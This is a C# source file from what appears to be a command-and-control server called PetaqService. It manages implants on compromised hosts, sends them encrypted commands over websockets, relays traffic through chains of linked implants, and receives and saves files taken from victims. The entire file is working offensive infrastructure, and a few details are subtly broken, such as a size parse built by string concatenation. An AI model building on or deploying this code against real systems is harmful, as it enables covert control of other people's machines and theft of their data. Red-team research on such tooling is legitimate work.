using System;
using System.Text;
using System.Threading;
using System.Net.WebSockets;
using System.Threading.Tasks;
using System.Text.RegularExpressions;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using System.Collections.Generic;
using System.Collections.Concurrent;
using System.Runtime.Serialization.Formatters.Binary;
using System.IO;
using System.Linq;

namespace PetaqService
{
    public class ImplantServiceSocket
    {
        private const int receiveChunkSize = 50;

        // socket information
        public string webSocketId { get; private set; }
        public WebSocket webSocket { get; private set; }

        // network information
        public string link_uri { get; set; }

        // write received implant output to the console when necessary
        public bool writeConsoleOutput { get; private set; }

        // implant identity and information
        public String implantID { get; set; }
        public String userName { get; set; }
        public String hostName { get; set; }
        public String implantIP { get; set; }
        public bool implantStatus { get; set; }
        public DateTime dateConnected { get; private set; } // the implant connection date
        public DateTime dateDisconnected { get; private set; } // the implant disconnection date
        public LogFile logFile { get; set; }

        // implant identity and information
        public string linkedParent { get; set; }
        public ConcurrentDictionary<string, ImplantServiceSocket> linkedChildren = new ConcurrentDictionary<string, ImplantServiceSocket>();



        public ImplantServiceSocket(string wId, WebSocket ws) 
        {
            webSocketId = wId;
            webSocket = ws;
            userName = "";
            hostName = "";
            implantID = "";
        }

        public void SetConsoleOutput(bool co)
        {
           writeConsoleOutput = co;
        }

        public void SetLinkedParent(string lp)
        {
            linkedParent = lp;
        }

        public void SetLogFile(LogFile lf)
        {
            logFile = lf;
        }

        //public void SetImplantStatus(string istatus)
        //{
        //    implantStatus = istatus;
        //}

        public void RegisterImplantInfo(dynamic implantInfo)
        {
            implantID = implantInfo.implantID;
            userName = implantInfo.userName;
            hostName = implantInfo.hostName;
            dateConnected = DateTime.Now;

            implantStatus = true;

            logFile.Write(implantID + " is connected at "+ dateConnected + "."
                + "\nSocket ID is " + webSocketId+"."
                + "\nUsername: "+userName+" Hostname: "+hostName
                +" IP Address: "+implantIP
                );

            // print debug for each session received.
            Console.WriteLine("Implant registration for {0} is done.", webSocketId);
        }
        public void RegisterLinkedImplantInfo(dynamic linkObj)
        {
            foreach (JProperty i in linkObj)
            {
                // define the linked child object
                ImplantServiceSocket linkedChild;

                // use the socketID sent by the parent link
                string socketId = i.Name;

                // if linked socket is not in the list create a new one
                if ( ! linkedChildren.ContainsKey(i.Name) )
                {
                    // creating the child object for the implant socket
                    linkedChild = ImplantManagement.CreateImplant(socketId, webSocket);
                }
                else
                {
                    linkedChild = linkedChildren[i.Name];
                }

                // adding the child object to the linkedChildren
                linkedChildren.TryAdd(socketId, linkedChild);

                // set the proto sent by the parent link
                linkedChild.link_uri = linkObj[i.Name].link_uri;

                // adding the parent information to the linked socket
                linkedChild.linkedParent = webSocketId;

                // adding the IP information to the linked socket
                linkedChild.implantIP = linkObj[i.Name].implantIP;

                // update link dates and status using data from the parent
                //linkedChild.dateConnected = linkObj[i.Name].dateConnected;
                //linkedChild.dateDisconnected = linkObj[i.Name].dateDisconnected;
                linkedChild.implantStatus = linkObj[i.Name].status;

                // print debug for each session received.
                Console.WriteLine("Implant linking for {0} is done.", linkedChild.webSocketId);

            }

            // remember to reset the menu
            Program.petaconsole.ResetMenu();
        }

        public async Task Send(string data = "")
        {
            if (data == "") return;

            // writing the command sending to the file with a timestamp
            //logFile.WriteLine(DateTime.Now+":"+data);
            logFile.Write(DateTime.Now + " #> " + data);

            try
            {
                // check if the socket is linked to a parent socket
                if (linkedParent == null)
                {
                    // data is encrypting before sending
                    data = Common.Encrypt(data);
                    byte[] sbuffer = Encoding.UTF8.GetBytes(data);

                    // sending the data directly
                    await webSocket.SendAsync(new ArraySegment<byte>(sbuffer), WebSocketMessageType.Text, true, CancellationToken.None);

                }
                else
                {
                    // add linking prefix
                    data = "transmit " + webSocketId + " " + data;
                    //Console.WriteLine("Sending commands through the link: {0}", data);

                    // data is encrypting before sending
                    data = Common.Encrypt(data);
                    byte[] sbuffer = Encoding.UTF8.GetBytes(data);

                    // sending the data through the linked parent
                    await Program.implantSockets[linkedParent].webSocket.SendAsync(new ArraySegment<byte>(sbuffer), WebSocketMessageType.Text, true, CancellationToken.None);

                }
            }
            catch (Exception e)
            {                
                Console.WriteLine("Data couldn't send as {0} is disconnected.", webSocketId);
                UpdateStatusOnDisconnect(e);
            }
        }   

        public async Task Receive()
        {
            try
            {
                while (webSocket.State == WebSocketState.Open)
                {
                    // get the buffer length instruction first
                    byte[] rbuffer = new byte[receiveChunkSize];
                    var result = await webSocket.ReceiveAsync(new ArraySegment<byte>(rbuffer), CancellationToken.None);
                    string implant_response = Encoding.UTF8.GetString(rbuffer).Replace("\0", string.Empty);
                    implant_response = Common.Decrypt(implant_response);

                    // incoming message is "buffer 123213" for length
                    int buffer_length = Int32.Parse(implant_response.Split(" ")[1]);

                    // set the buffer and read the data
                    byte[] databuffer = new byte[buffer_length];
                    result = await webSocket.ReceiveAsync(new ArraySegment<byte>(databuffer), CancellationToken.None);
                    string encrypteddata = Encoding.UTF8.GetString(databuffer).Replace("\0", string.Empty);

                    string data = Common.Decrypt(encrypteddata);

                    // Instruction to the C2
                    string instruction = Regex.Split(data, " ")[0];

                    switch (instruction)
                    {
                        // route uptadates
                        case "routeupdates":
                            // ignore route requests without origin
                            // direct connected implants have no next hop
                            if (Regex.Split(data, " ").Length < 2) { break; }

                            // session requesting the route update
                            string rid = Regex.Split(data, " ")[1];

                            if (! Program.implantRoutes.ContainsKey(rid)) {
                                Console.WriteLine("Updating the routing table...");
                                // webSocketId is the session delivering the update
                                Program.implantRoutes.TryAdd(rid, webSocketId);
                            }
                            else
                            {
                                Console.WriteLine("No updates required.");
                            }                            
                            break;


                        // scenario report process
                        case "scenario_report":
                            if (Regex.Split(data, " ").Length <1)
                            {
                                Console.WriteLine("Scenario report is missing.");
                            }
                            else
                            {
                                // parse the scenario report delivered
                                string scenario_report = Encoding.UTF8.GetString(Convert.FromBase64String(Regex.Split(data, " ")[1]));
                                dynamic scenario_reportObj = JsonConvert.DeserializeObject(scenario_report);

                                // set the scenario ID as string
                                string scenarioID = scenario_reportObj.scenarioID;

                                // update the scenario status and add the report
                                Program.scenarios[scenarioID].status = "completed";
                                Program.scenarios[scenarioID].stop = DateTime.Now.ToString("dd/MM/yyyy HH:mm:ss");
                                Program.scenarios[scenarioID].report = scenario_reportObj;
                                Console.WriteLine("Scenario {0} is finished, results reported.", scenarioID);
                            }

                            break;
                        // route remove
                        case "routeremove":
                            // if a sessions gets removed, route gets deleted for entire path
                            if (Regex.Split(data, " ").Length < 2) { break; }

                            // check the route in the table
                            string rrid = Regex.Split(data, " ")[1];

                            if (Program.implantRoutes.ContainsKey(rrid))
                            {
                                Console.WriteLine("Removing the route as requested...");
                                Program.implantRoutes.TryRemove(rrid, out string rridvalue);
                                Console.WriteLine("Sessions is marking as disconnected.");
                                Program.implantSockets[rrid].implantStatus = false;
                            }
                            else
                            {
                                Console.WriteLine("No updates required.");
                            }
                            break;

                        // Registering the implant if "register" issued
                        case "register":
                            Console.WriteLine("Registering the implant...");
                            // on-demand registration for linking operations
                            string implantInfo = Encoding.UTF8.GetString(Convert.FromBase64String(Regex.Split(data, " ")[1]));
                            //Console.WriteLine("Implant Info:\n{0}", implantInfo);
                            implantInfo = implantInfo.Replace("\\ ", " ");
                            dynamic implantObj = JsonConvert.DeserializeObject(implantInfo);
                            RegisterImplantInfo(implantObj);
                            break;

                        // Registering the linked implants if "register" issued
                        case "registerlinks":
                            Console.WriteLine("Links are adding to the implant...");
                            try
                            {
                                string linkInfo = Encoding.UTF8.GetString(Convert.FromBase64String(Regex.Split(data, " ")[1]));
                                dynamic linkObj = JsonConvert.DeserializeObject(linkInfo);
                                RegisterLinkedImplantInfo(linkObj);
                            }
                            catch (Exception e)
                            {
                                Console.WriteLine(e);
                            }

                            break;

                        // Processing the link data coming from the implant if links exist
                        case "download":
                            // Processing the download instruction
                            DownloadData(data, false);
                            break;
                        // Processing the link data coming from the implant if links exist
                        case "transmit":
                            // Processing the linked implant data passed through

                            // parsing the linking prefix
                            string[] dataarray = Regex.Split(data, " ");
                            string childSocketId = dataarray[1];

                            // realign data
                            data = String.Join(" ", dataarray.SubArray(2, (dataarray.Length - 2)));

                            switch (data.Split(" ")[0]) {
                                // Registering the linked implants if "register" issued
                                case "register":
                                    Console.WriteLine("Registering the linked implant...");
                                    // registering the linked implant
                                    string limplantInfo = Encoding.UTF8.GetString(Convert.FromBase64String(Regex.Split(data, " ")[1]));
                                    dynamic limplantObj = JsonConvert.DeserializeObject(limplantInfo);
                                    Program.implantSockets[childSocketId].RegisterImplantInfo(limplantObj);
                                    break;
                                // Registering the linked implants links if "registerlinks" issued
                                case "registerlinks":
                                    Console.WriteLine("Registering the linked implant links...");
                                    try
                                    {
                                        string linkInfo = Encoding.UTF8.GetString(Convert.FromBase64String(Regex.Split(data, " ")[1]));
                                        dynamic linkObj = JsonConvert.DeserializeObject(linkInfo);
                                        RegisterLinkedImplantInfo(linkObj);
                                    }
                                    catch (Exception e)
                                    {
                                        Console.WriteLine(e);
                                    }
                                    break;
                                // Processing the link data coming from the implant if links exist
                                case "download":
                                    // Processing the download instruction
                                    DownloadData(data, true);
                                    break;
                                default:
                                    // processing the data coming from the linked implant
                                    Program.implantSockets[childSocketId].logFile.Write(data);
                                    if (Program.implantSockets[childSocketId].writeConsoleOutput) {
                                        Console.WriteLine(data);
                                        Program.petaconsole.ResetMenu();
                                    }
                                    break;
                            }                            
                            break;

                        // Processing the data coming from the implant 
                        default:
                            logFile.Write(data);
                            //if (writeConsoleOutput) { Console.WriteLine("\n" + data); Program.petaconsole.ResetMenu(); }
                            if (writeConsoleOutput) { Console.WriteLine(data); Program.petaconsole.ResetMenu(); }
                            break;
                    }

                    // Closing the socket 
                    if (result.MessageType == WebSocketMessageType.Close)
                    {
                        await webSocket.CloseOutputAsync(WebSocketCloseStatus.NormalClosure, string.Empty, CancellationToken.None);
                        UpdateStatusOnDisconnect();
                    }
                }
            }
            catch (Exception e)
            {
                UpdateStatusOnDisconnect(e);

            }

        }

        private async void DownloadData(string dinstruction, bool linked)
        {

            // get the buffer length instruction first
            byte[] dbuffer = new byte[receiveChunkSize];
            var bufres = await webSocket.ReceiveAsync(new ArraySegment<byte>(dbuffer), CancellationToken.None);
            string implant_response = Encoding.UTF8.GetString(dbuffer).Replace("\0", string.Empty);
            implant_response = Common.Decrypt(implant_response);

            // incoming message is "buffer 123213" for length
            int buffer_length = Int32.Parse(implant_response.Split(" ")[1]);

            //// set the buffer and read the data
            //byte[] databuffer = new byte[buffer_length];
            //result = await webSocket.ReceiveAsync(new ArraySegment<byte>(databuffer), CancellationToken.None);
            //string encrypteddata = Encoding.UTF8.GetString(databuffer).Replace("\0", string.Empty);

            //string data = Common.Decrypt(encrypteddata);


            // Processing the download instruction
            string[] downloadarray = Regex.Split(dinstruction, " ");
            int filecontentsize = Int32.Parse(downloadarray[1]+300);
            string filename = String.Join(" ", downloadarray.SubArray(2, (downloadarray.Length - 2)));
            Console.WriteLine("\nIncoming file: {0}", filename);
            logFile.Write("\nIncoming file: " + filename);

            // Receiving for the file size given and decrypting it
            byte[] fbuffer = new byte[buffer_length];
            var downres = await webSocket.ReceiveAsync(new ArraySegment<byte>(fbuffer), CancellationToken.None);
            string filecontentencrypted = Encoding.UTF8.GetString(fbuffer).Replace("\0", string.Empty);
            string filecontentencoded;

            if (linked)
            {
                // The decrypted content has "transmit SOCKETID ENCODEDDATA"
                // So get only the ENCODEDDATA 
                filecontentencoded = Regex.Split(Common.Decrypt(filecontentencrypted), " ").Last();          
            }
            else
            {
                filecontentencoded = Common.Decrypt(filecontentencrypted);
            }
            
            // Creating the files folder if doesn't exist
            string filesFolderName = Path.Combine("Files", Program.logDate, webSocketId);
            string filenameonly = Regex.Split(filename, "/").Last();
            string localFileName = Path.Combine(filesFolderName, DateTime.Now.ToString("yyyy-M-dd---HH-mm-ss---") + filenameonly);
            try
            {
                // Writing the content to the local file
                File.WriteAllBytes(localFileName, Convert.FromBase64String(filecontentencoded));
                Console.WriteLine("Downloading {0} is successful.\nFull path: {1}", filenameonly, localFileName.Replace(@"\",@"\\"));
                logFile.Write("\nDownload is successful.\nFull path: " + localFileName);

            }
            catch (Exception e)
            {
                Console.WriteLine("Files folder or file couldn't be created: {0}.", e);
            }
        }

        public void UpdateStatusOnDisconnect(Exception e = null)
        {
            // mark socket as disconnected
            implantStatus = false;
            dateDisconnected = DateTime.Now;

            // debug message for console
            Console.Error.WriteLine("Session {0} is disconnected.", webSocketId);

            // clean up the console Implant ID 
            if ( PetaqConsole.implantname == webSocketId ) { PetaqConsole.implantname = null; PetaqConsole.stillconnected = false; }

            // remove the routes
            foreach (var r in Program.implantRoutes)
            {                
                if (r.Value == webSocketId)
                {
                    Program.implantSockets[r.Key].implantStatus = false;
                    Program.implantRoutes.TryRemove(r.Key, out string rvalue);
                }
            }

            // logging
            logFile.Write("Socket is disconnected on " + dateDisconnected);
            if (e != null) {
                logFile.Write("Socket error:\n" + e);
                //Console.Error.WriteLine("Socket error:\n" + e);
            }


            // mark linked children as disconnected
            if (!linkedChildren.IsEmpty)
            {
                foreach (var child in linkedChildren)
                {
                    // mark socket as disconnected
                    child.Value.implantStatus = false;
                    child.Value.dateDisconnected = dateDisconnected;

                    // logging
                    Program.implantSockets[linkedParent].logFile.Write("Parent socket is disconnected on " + dateDisconnected);
                    if (e != null)
                    {
                        logFile.Write("Socket error:\n" + e);
                    }

                    // debug message for console
                    Console.Error.WriteLine("Session {0} is disconnected.", child.Value.webSocketId);

                    // clean up the console Implant ID 
                    if (PetaqConsole.implantname == child.Value.webSocketId) { PetaqConsole.implantname = null; PetaqConsole.stillconnected = false; }

                }
            }

            Program.petaconsole.ResetMenu();
        }


    }
}
